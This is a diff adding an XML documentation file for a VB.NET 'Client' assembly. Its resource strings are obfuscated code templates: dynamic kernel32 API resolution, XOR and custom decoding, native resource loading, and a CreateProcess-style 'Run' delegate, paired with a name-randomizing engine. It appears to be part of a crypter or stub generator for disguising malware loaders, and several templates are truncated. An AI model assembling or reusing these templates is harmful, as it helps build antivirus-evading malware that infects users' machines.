@@ -1,0 +1,221 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+Client
+</name>
+</assembly>
+<members>
+<member name="T:Client.My.Resources.Resources">
+<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.ResourceManager">
+<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.Culture">
+<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.API">
+<summary>
+  Looks up a localized string similar to &lt;DllImport(&quot;kernel32.dll&quot;, EntryPoint:=&quot;!R1&quot;)&gt; _
+Function !N1(ByVal ?N2 As String) As IntPtr
+End Function
+$GB
+&lt;DllImport(&quot;kernel32.dll&quot;, EntryPoint:=&quot;GetProcAddress&quot;)&gt; _
+Function !N1(ByVal ?N2 As IntPtr, ByVal ?N3 As String) As IntPtr
+End Function
+$GB
+Function !N1(Of ?N2)(!P1) As ?N2
+$PV
+$PV
+Return CType(CType(Marshal.GetDelegateForFunctionPointer(!N1(!N1(?N3.Split(Convert.ToChar(58))(0)), ?N3.Split(Convert.ToChar(58))(1)), GetType(?N2)), Object), ?N2)
+End Function
+$GB.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.AssemblyEditor">
+<summary>
+  Looks up a localized string similar to &lt;Assembly: AssemblyTitle(&quot;{1}&quot;)&gt; 
+&lt;Assembly: AssemblyDescription(&quot;{2}&quot;)&gt; 
+&lt;Assembly: AssemblyCompany(&quot;{3}&quot;)&gt; 
+&lt;Assembly: AssemblyProduct(&quot;{4}&quot;)&gt; 
+&lt;Assembly: AssemblyCopyright(&quot;{5}&quot;)&gt; 
+&lt;Assembly: AssemblyTrademark(&quot;{6}&quot;)&gt;
+&lt;Assembly: AssemblyFileVersion(&quot;{7}.{8}.{9}.{10}&quot;)&gt;
+&lt;Assembly: AssemblyVersion(&quot;{7}.{8}.{9}.{10}&quot;)&gt;.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.Decode">
+<summary>
+  Looks up a localized string similar to Private ?N9 As Byte() = New Byte() {0, 0, 10, 12, 13, 15, 34, 127, 133}
+$GB
+Function !N1(!P1) As Byte()
+$PV
+Dim ?N2(8) As Byte, ?N3 As New Dictionary(Of Char, Byte)(255)
+Dim ?N4 As New MemoryStream(?N1.Length), ?N5 As Byte, ?N6 As Boolean, ?N7 As Integer
+For ?N8 As Integer = 0 To 255
+?N3.Add(Convert.ToChar(?N8), CByte(?N8))
+Next
+?N9(0) = ?N3(?N1(0))
+For ?N8 As Byte = 1 To 9
+?N2(?N8 - 1) = ?N3(?N1(?N8))
+Next
+For ?N8 As Integer = 10 To ?N1.Length - 1
+?N5 = ?N3(?N1(?N8))
+If ?N5 = ?N9(0) Then
+?N [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.GetBytes">
+<summary>
+  Looks up a localized string similar to Function !N1(!P1) As Byte()
+$PV
+Dim ?N2 As Drawing.Color = Drawing.Color.FromArgb(?N1)
+$PV
+Return New Byte() {?N2.B, ?N2.G, ?N2.R, ?N2.A}
+End Function
+$GB.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.Native">
+<summary>
+  Looks up a localized string similar to Delegate Function ?N5 (ByVal !N1 As String) As IntPtr
+$GB
+Delegate Function ?N6 (ByVal !N1 As IntPtr, ByVal ?N1 As String, ByVal ?N2 As String) As IntPtr
+$GB
+Delegate Function ?N7 (ByVal !N1 As IntPtr, ByVal ?N1 As IntPtr) As Integer
+$GB
+Delegate Function ?N8 (ByVal !N1 As IntPtr, ByVal ?N1 As IntPtr) As IntPtr
+$GB
+Function !N1(!P1) As Byte()
+$PV
+Dim ?N2 As IntPtr = !D1(Assembly.GetEntryAssembly.Location)
+Dim ?N3 As IntPtr = !D2(?N2, ?N1, !S1)
+Dim ?N4(!D3(?N2, ?N3) - 1) As Byte
+Marshal.Copy(!D4 [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.Numeric">
+<summary>
+  Looks up a localized string similar to Function !N1(!P1) As Byte()
+$PV
+Dim ?N2 As New MemoryStream, ?N3 As Byte()
+For Each ?N4 As Object In ?N1
+If TypeOf ?N4 Is Byte() Then
+?N3 = DirectCast(?N4, Byte())
+?N2.Write(?N3, 0, ?N3.Length)
+Else
+For Each ?N5 As ULong In DirectCast(?N4, ULong())
+?N3 = BitConverter.GetBytes(?N5)
+?N2.Write(?N3, 0, ?N3.Length)
+Next
+End If
+Next
+!N1 = ?N2.ToArray
+?N2.Close()
+$PV
+End Function
+$GB.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.Run">
+<summary>
+  Looks up a localized string similar to Delegate Function ?N21(ByVal !N1 As String, ByVal ?N2 As String, ByVal ?N3 As IntPtr, ByVal ?N4 As IntPtr, ByVal ?N5 As Boolean, ByVal ?N6 As Integer, ByVal ?N7 As IntPtr, ByVal ?N8 As String, ByVal ?N9 As Byte(), ByVal ?N10 As IntPtr()) As Boolean
+$GB
+Delegate Function ?N22(ByVal !N1 As IntPtr, ByVal ?N2 As UInteger()) As Boolean
+$GB
+Delegate Function ?N23(ByVal !N1 As IntPtr, ByVal ?N2 As IntPtr, ByRef ?N3 As IntPtr, ByVal ?N4 As IntPtr, ByRef ?N5 As IntPtr) As Boolean
+$GB
+Delegate Function ?N24(ByV [rest of string was truncated]&quot;;.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.String_">
+<summary>
+  Looks up a localized string similar to Function !N1(!P1) As String
+$PV
+$PV
+Return Encoding.UTF8.GetString(!R1)
+End Function
+$GB.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.String1">
+<summary>
+  Looks up a localized string similar to Sokrat ti u gacama.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.ToInt32">
+<summary>
+  Looks up a localized string similar to Function !N1(!P1) As Integer
+$PV
+$PV
+Return Drawing.Color.FromArgb(?N1(?N2 + 3), ?N1(?N2 + 2), ?N1(?N2 + 1), ?N1(?N2)).ToArgb
+End Function
+$GB.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.Wow64">
+<summary>
+  Looks up a localized string similar to Delegate Function ?N3(ByVal handle As IntPtr, ByRef result As Boolean) As Boolean
+Function !N1(!P1) As Boolean
+If IntPtr.Size = 8 Then Return True
+Dim ?N1 As Version = Environment.OSVersion.Version
+If ?N1.Major = 5 And ?N1.Minor &gt; 0 Or ?N1.Major &gt; 5 Then
+Dim ?N2 As Boolean
+If Not !D1(Process.GetCurrentProcess.Handle, ?N2) Then Return False
+Return ?N2
+End If
+Return False
+End Function.
+</summary>
+</member>
+<member name="P:Client.My.Resources.Resources.XOR_">
+<summary>
+  Looks up a localized string similar to Function !N1(!P1) As Byte()
+$PV
+Dim ?N2 As Byte() = !R1
+Dim ?N3 As Integer = ?N2.Length
+For ?N4 As Integer = 0 To ?N1.Length - 1
+?N1(?N4) = ?N1(?N4) Xor ?N2(?N4 Mod ?N3)
+Next
+$PV
+Return ?N1
+End Function
+$GB.
+</summary>
+</member>
+<member name="P:Client.Base.Engine.Last">
+ <summary>
+ Returns the last name randomly generated name.
+ </summary>
+</member>
+<member name="M:Client.Base.Engine.Transform(System.String[])">
+ <summary>
+ Generates a dynamic routine signature, keeping the provided parameters intact.
+ </summary>
+</member>
+<member name="M:Client.Base.Engine.Randomize(System.String)">
+ <summary>
+ Obfuscates generated variable names.
+ </summary>
+</member>
+<member name="M:Client.Base.Engine.Name">
+ <summary>
+ Returns the next available name.
+ </summary>
+</member>
+<member name="M:Client.Base.Engine.Parse(System.String)">
+ <summary>
+ Parses the data, replacing each instance of ?N# or !N# with a randomized name. 
+ Returning !N# instances for use later on.
+ </summary>
+</member>
+</members>
+</doc>
